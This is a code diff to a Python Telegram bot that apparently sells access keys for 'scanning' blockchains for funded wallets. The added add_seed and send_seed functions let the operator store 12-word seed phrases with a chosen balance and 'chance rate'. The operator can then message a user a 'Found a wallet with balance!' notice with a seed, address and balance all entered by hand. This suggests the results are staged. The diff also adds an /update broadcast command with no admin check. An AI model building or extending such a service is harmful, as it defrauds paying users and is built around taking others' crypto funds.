@@ -645,7 +645,6 @@ def add_admin(update: Update, context: CallbackContext) -> None:
         firebase_set(f"admins/{new_admin_id}", {"user_id": new_admin_id, "username": username})
         update.message.reply_text(f"✅ Admin added: {username} [{new_admin_id}]")
 
-# --- IMPORTANT: Added remove_admin function ---
 def remove_admin(update: Update, context: CallbackContext) -> None:
     user_id = update.message.chat.id
     if user_id != ADMIN_ID:
@@ -660,7 +659,6 @@ def remove_admin(update: Update, context: CallbackContext) -> None:
     admin_id = args[0]
     firebase_delete(f"admins/{admin_id}")
     update.message.reply_text(f"✅ Admin removed: [{admin_id}]")
-# --- End of remove_admin function ---
 
 def create_key(update: Update, context: CallbackContext) -> None:
     user_id = update.message.chat.id
@@ -692,6 +690,27 @@ def create_key(update: Update, context: CallbackContext) -> None:
 
     firebase_set(f"masterkeys/{key}", {"key": key, "expiration": expiration_str, "can_use_booster": booster_mode})
     update.message.reply_text(f"✅ Key created: {key}\n📅 Expiration: {expiration_str}\n🚀 Booster mode: {booster_mode}")
+
+# ------------------ Added handle_admin_callback Function ------------------ #
+def handle_admin_callback(update: Update, context: CallbackContext) -> None:
+    query = update.callback_query
+    user_id = query.message.chat.id
+    if user_id != ADMIN_ID:
+        query.answer("❌ Unauthorized action.", show_alert=True)
+        return
+    query.answer()
+    if query.data == 'admin_create_key':
+        query.edit_message_text("➕ Use /create_key <key> <expiration (DD-MM-YYYY)> <booster (true/false)> to create a key.")
+    elif query.data == 'admin_remove_key':
+        query.edit_message_text("➖ Use /remove_key <key> to remove a key.")
+    elif query.data == 'admin_show_keys':
+        show_keys(update, context)
+    elif query.data == 'admin_stop_all_scans':
+        stop_all_scans(update, context)
+    elif query.data == 'admin_add_seed':
+        query.edit_message_text("➕ Use /add_seed <12_words> <balance> <blockchain> <chance rate (1-100%)> to add a seed.")
+    elif query.data == 'admin_show_seed':
+        show_seed(update, context)
 
 def button_callback(update: Update, context: CallbackContext) -> None:
     query = update.callback_query
@@ -768,6 +787,64 @@ def optimize_memory():
     while True:
         gc.collect()
         time.sleep(600)
+
+# ------------------ Updated /send_seed Command ------------------ #
+def send_seed(update: Update, context: CallbackContext) -> None:
+    user_id = update.message.chat.id
+
+    if user_id != ADMIN_ID:
+        update.message.reply_text("❌ You don't have permission to send seeds.")
+        return
+
+    args = context.args
+    if not (len(args) == 5 or len(args) == 16):
+        update.message.reply_text("❌ Usage: /send_seed <seed_id> <user_id> <address> <balance> <blockchain> OR /send_seed <12_words> <user_id> <address> <balance> <blockchain>")
+        return
+
+    try:
+        if len(args) == 16:
+            seed_phrase = " ".join(args[:12])
+            seed_id = seed_phrase.replace(" ", "_")
+            target_user_id = args[12]
+            address = args[13]
+            balance = float(args[14])
+            blockchain = args[15].lower()
+        else:
+            seed_id = args[0]
+            target_user_id = args[1]
+            address = args[2]
+            balance = float(args[3])
+            blockchain = args[4].lower()
+
+        valid_blockchains = ['eth', 'bnb', 'matic', 'avax', 'btc', 'sol', 'pol']
+        if blockchain not in valid_blockchains:
+            update.message.reply_text(f"❌ Unsupported blockchain: {blockchain.upper()}. Supported: {', '.join(valid_blockchains).upper()}")
+            return
+
+        seed_record = firebase_get(f"seeds/{seed_id}")
+        if not seed_record:
+            update.message.reply_text("❌ Seed not found. Please check the seed ID.")
+            return
+
+        firebase_update(f"seeds/{seed_id}", {"address": address, "balance": balance, "blockchain": blockchain})
+
+        message = (
+            f"🎉 **Found a wallet with balance!**\n\n"
+            f"🌱 **Seed:** `{seed_record.get('seed')}`\n"
+            f"🏦 **Address:** `{address}`\n"
+            f"💰 **Balance:** {balance} {blockchain.upper()}\n\n"
+            f"🔗 *Use this wallet responsibly!*"
+        )
+
+        context.bot.send_message(target_user_id, message, parse_mode=ParseMode.MARKDOWN)
+        update.message.reply_text(f"✅ Seed {seed_id} sent successfully to user {target_user_id}.")
+
+    except ValueError as e:
+        update.message.reply_text("❌ Invalid input. Please check the arguments and try again.")
+        logging.error(f"Input validation error: {e}")
+    except Exception as e:
+        update.message.reply_text("❌ Failed to send the seed. Please check the logs for details.")
+        logging.error(f"Error sending seed: {e}", exc_info=True)
 
 def remove_key(update: Update, context: CallbackContext) -> None:
     user_id = update.message.chat.id
@@ -867,6 +944,7 @@ def admin_panel(update: Update, context: CallbackContext) -> None:
 # Dictionary to track ongoing checks per user
 ongoing_checks = {}
 
+# ------------------ Updated /add_seed Command ------------------ #
 def add_seed(update: Update, context: CallbackContext) -> None:
     user_id = update.message.chat.id
 
@@ -875,32 +953,35 @@ def add_seed(update: Update, context: CallbackContext) -> None:
         return
 
     args = context.args
-    if len(args) < 3:
-        update.message.reply_text("❌ Usage: /add_seed <12_words> <balance> <chance rate (1-100%)>")
+    # Expecting 12 words for seed, plus balance, blockchain, chance rate → total 15 arguments.
+    if len(args) < 15:
+        update.message.reply_text("❌ Usage: /add_seed <12_words> <balance> <blockchain> <chance rate (1-100%)>")
         return
 
-    seed = args[0]
-    balance = float(args[1])
-    chance_rate = float(args[2])
+    try:
+        seed = " ".join(args[:12])  # Combine first 12 words as the seed phrase
+        balance = float(args[12])
+        blockchain = args[13].upper()
+        chance_rate_str = args[14].replace("%", "")
+        chance_rate = float(chance_rate_str)
 
-    if not (1 <= chance_rate <= 100):
-        update.message.reply_text("❌ Chance rate must be between 1% and 100%.")
-        return
+        if not (1 <= chance_rate <= 100):
+            update.message.reply_text("❌ Chance rate must be between 1 and 100.")
+            return
 
-    data = {
-        "seed": seed,
-        "balance": balance,
-        "chance_rate": chance_rate,
-        "added_by": user_id,
-        "created_at": datetime.now().isoformat()
-    }
-    url = f"{FIREBASE_URL}seeds.json"
-    response = requests.post(url, json=data)
-    if response.status_code == 200:
-        update.message.reply_text(f"✅ Seed added successfully!\nSeed: {seed}\nBalance: {balance}\nChance Rate: {chance_rate}%")
-    else:
-        update.message.reply_text("❌ Failed to add seed.")
-        logging.error(f"Error adding seed: {response.text}")
+        data = {
+            "seed": seed,
+            "balance": balance,
+            "blockchain": blockchain,
+            "chance_rate": chance_rate,
+            "added_by": user_id,
+            "created_at": datetime.now().isoformat()
+        }
+        
+        firebase_set(f"seeds/{seed.replace(' ', '_')}", data)
+        update.message.reply_text(f"✅ Seed added successfully!\n🌱 Seed: `{seed}`\n💰 Balance: {balance}\n🔗 Blockchain: {blockchain}\n⚡ Chance Rate: {chance_rate}%")
+    except ValueError:
+        update.message.reply_text("❌ Invalid input format. Make sure balance and chance rate are numbers.")
 
 def show_seed(update: Update, context: CallbackContext) -> None:
     user_id = update.message.chat.id
@@ -924,78 +1005,6 @@ def show_seed(update: Update, context: CallbackContext) -> None:
             update.message.reply_text(f"🔑 **Seeds List**:\n\n{chunk}", parse_mode=ParseMode.MARKDOWN)
     else:
         update.message.reply_text("❌ No seeds found in the database.")
-
-def send_seed(update: Update, context: CallbackContext) -> None:
-    user_id = update.message.chat.id
-
-    if user_id != ADMIN_ID:
-        update.message.reply_text("❌ You don't have permission to send seeds.")
-        return
-
-    args = context.args
-    if len(args) < 5:
-        update.message.reply_text("❌ Usage: /send_seed <seed_id> <user_id> <address> <balance> <blockchain>")
-        return
-
-    try:
-        seed_id = args[0]
-        target_user_id = args[1]
-        address = args[2]
-        balance = float(args[3])
-        blockchain = args[4].lower()
-
-        valid_blockchains = ['eth', 'bnb', 'matic', 'avax', 'btc', 'sol', 'pol']
-        if blockchain not in valid_blockchains:
-            update.message.reply_text(f"❌ Unsupported blockchain: {blockchain.upper()}. Supported: {', '.join(valid_blockchains).upper()}")
-            return
-
-        seed_record = firebase_get(f"seeds/{seed_id}")
-        if not seed_record:
-            update.message.reply_text("❌ Seed not found. Please check the seed ID.")
-            return
-
-        firebase_update(f"seeds/{seed_id}", {"address": address, "balance": balance, "blockchain": blockchain})
-
-        message = (
-            f"🎉 **Found a wallet with balance!**\n\n"
-            f"🌱 **Seed:** `{seed_record.get('seed')}`\n"
-            f"🏦 **Address:** `{address}`\n"
-            f"💰 **Balance:** {balance} {blockchain.upper()}\n\n"
-            f"🔗 *Use this wallet responsibly!*"
-        )
-
-        context.bot.send_message(target_user_id, message, parse_mode=ParseMode.MARKDOWN)
-        update.message.reply_text(f"✅ Seed {seed_id} sent successfully to user {target_user_id}.")
-
-    except ValueError as e:
-        update.message.reply_text("❌ Invalid input. Please check the arguments and try again.")
-        logging.error(f"Input validation error: {e}")
-    except Exception as e:
-        update.message.reply_text("❌ Failed to send the seed. Please check the logs for details.")
-        logging.error(f"Error sending seed: {e}", exc_info=True)
-
-def handle_admin_callback(update: Update, context: CallbackContext) -> None:
-    query = update.callback_query
-    user_id = query.message.chat.id
-
-    if user_id != ADMIN_ID:
-        query.answer("❌ Unauthorized action.", show_alert=True)
-        return
-
-    query.answer()
-
-    if query.data == 'admin_create_key':
-        query.edit_message_text("➕ Use /create_key <key> <expiration (DD-MM-YYYY)> <booster (true/false)> to create a key.")
-    elif query.data == 'admin_remove_key':
-        query.edit_message_text("➖ Use /remove_key <key> to remove a key.")
-    elif query.data == 'admin_show_keys':
-        show_keys(update, context)
-    elif query.data == 'admin_stop_all_scans':
-        stop_all_scans(update, context)
-    elif query.data == 'admin_add_seed':
-        query.edit_message_text("➕ Use /add_seed <12_words> <balance> <chance rate (1-100%)> to add a seed.")
-    elif query.data == 'admin_show_seed':
-        show_seed(update, context)
 
 def pod_command(update: Update, context: CallbackContext) -> None:
     user_id = update.message.chat.id
@@ -1096,17 +1105,14 @@ def start_scan(update: Update, context: CallbackContext) -> None:
         logging.error(f"Error in start_scan: {e}")
         query.message.reply_text("❌ An error occurred while starting the scan. Please try again.")
 
-def watchdog(user_id, blockchain, context, booster=False):
-    while user_scan_status[user_id]['is_scanning']:
-        prev_scanned = user_scan_status[user_id]['wallets_scanned']
-        time.sleep(120)
-        if user_scan_status[user_id]['wallets_scanned'] == prev_scanned:
-            user_scan_status[user_id]['is_scanning'] = False
-            context.bot.send_message(chat_id=user_id, text=f"⚠️ The scan on {blockchain.upper()} seems to have paused. Restarting now...")
-            start_scan_by_id(user_id, blockchain, context.bot, booster)
-
 # Global variable to track scan status for users
 user_scan_status = {}
+
+# ------------------ Added /update Command Handler ------------------ #
+def update_command(update: Update, context: CallbackContext) -> None:
+    """Send the NOTIFICATION_MESSAGE to all active users."""
+    notify_all_users(context)
+    update.message.reply_text("✅ Notification sent to all active users.")
 
 def main() -> None:
     memory_thread = threading.Thread(target=optimize_memory)
@@ -1121,9 +1127,12 @@ def main() -> None:
     dispatcher.add_handler(CommandHandler("create_key", create_key))
     dispatcher.add_handler(CommandHandler("remove_key", remove_key))
     dispatcher.add_handler(CommandHandler("remove_admin", remove_admin))
+    dispatcher.add_handler(CommandHandler("add_seed", add_seed))
     dispatcher.add_handler(CommandHandler("clear_logs", clear_logs))
     dispatcher.add_handler(CommandHandler("admin_panel", admin_panel))
     dispatcher.add_handler(CommandHandler("send_seed", send_seed))
+    # Added /update command handler:
+    dispatcher.add_handler(CommandHandler("update", update_command))
     dispatcher.add_handler(CallbackQueryHandler(handle_admin_callback, pattern='admin_.*'))
     dispatcher.add_handler(CommandHandler("pod", pod_command))
     dispatcher.add_handler(MessageHandler(Filters.text | Filters.photo, handle_broadcast_input))
